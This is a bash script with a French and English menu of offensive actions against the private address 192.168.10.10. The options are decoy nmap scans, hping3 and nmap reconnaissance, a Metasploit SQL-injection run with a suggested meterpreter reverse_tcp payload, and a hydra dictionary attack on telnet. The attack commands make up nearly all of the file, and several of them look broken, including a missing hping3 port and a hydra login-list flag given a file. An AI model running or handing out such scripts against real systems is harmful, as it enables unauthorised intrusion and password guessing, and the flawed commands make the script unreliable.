#!/bin/bash

# vérifie que le script est exécuté en mode superutilisateur
if [ "$EUID" -ne 0 ]
  then echo "Veuillez exécuter le script en tant que superutilisateur."
  exit
fi


echo "Bienvenue dans le menu du script offensive"

# Create an array of options
options=("SYN, RST and ICMP attacks using nmap" 
    "Web services and database attacks using metasploit" 
    "Recognition attacks using hping and nmap"
    "Dictionary attack on telnet service using hydra"
    "Quit")
# Present menu with options
PS3="Please enter your choice: "
select opt in "${options[@]}"
do
    case $opt in
        "SYN, RST and ICMP attacks using nmap")
        # Perform task for SYN, RST and ICMP attacks using nmap
        echo "You chose SYN, RST and ICMP attacks using nmap"
        if ! [ -x "$(command -v nmap)" ]; then
          echo "Nmap n'est pas intallé. Installation..."
          apt install nmap
        else
          echo "Nmap is installed."
        fi
        nmap -D RND:100 -sS -n 192.168.10.10
        nmap -D RND:100 -sP -n 192.168.10.10
            ;;
        "Web services and database attacks using metasploit")
        
        # Perform task for Web services and database attacks using metasploit
        echo "You chose Web services and database attacks using metasploit"

        #verify if Metasploit is installed
        if ! [ -x "$(command -v  msfconsole)" ]; then
          echo "Metasploit is not installed. Installing..."
          sudo apt install metasploit-framework
        else
          echo "Metasploit is installed."
        fi
                

  echo "Cette attaque utilise Metasploit pour effectuer une injection SQL via HTTP."
  read -p "Entrez l'adresse IP cible : " target_ip
  read -p "Entrez le port cible : " target_port
  read -p "Entrez l'URI cible (ex. /login.php) : " target_uri
  read -p "Entrez le payload (ex. generic/meterpreter/reverse_tcp) : " payload
  msfconsole -q -x "use auxiliary/scanner/http/sql_injection;
    set RHOSTS $target_ip;
    set RPORT $target_port;
    set TARGETURI $target_uri;
    set PAYLOAD $payload;
    run;"
    ;;
  "Recognition attacks using hping and nmap")
  # Perform task for Recognition attacks using hping and nmap
  echo "You chose Recognition attacks using hping and nmap"
  # Set up the attack
  echo "Setting up the attack..."
  hping3 -S -c 1 -n -p 192.168.10.10
  nmap -sV -O 192.168.10.10
  ;;
  "Dictionary attack on telnet service using hydra")
  # Perform task for Dictionary attack on telnet service using hydra
  echo "You chose Dictionary attack on telnet service using hydra"
  #verify if Metasploit is installed

  if ! [ -x "$(command -v hydra)" ]; then
    echo "hydra is not installed. Installing..."
    apt install hydra
  else
    echo "hydra is installed."
  fi
  git clone https://github.com/jeanphorn/wordlist.git
  cd wordlist
  hydra -l usernames.txt -P passlist.txt telnet://192.168.10.10
  ;;
  "Quit")
  break
  ;;
  *) echo invalid option;;
  esac
done
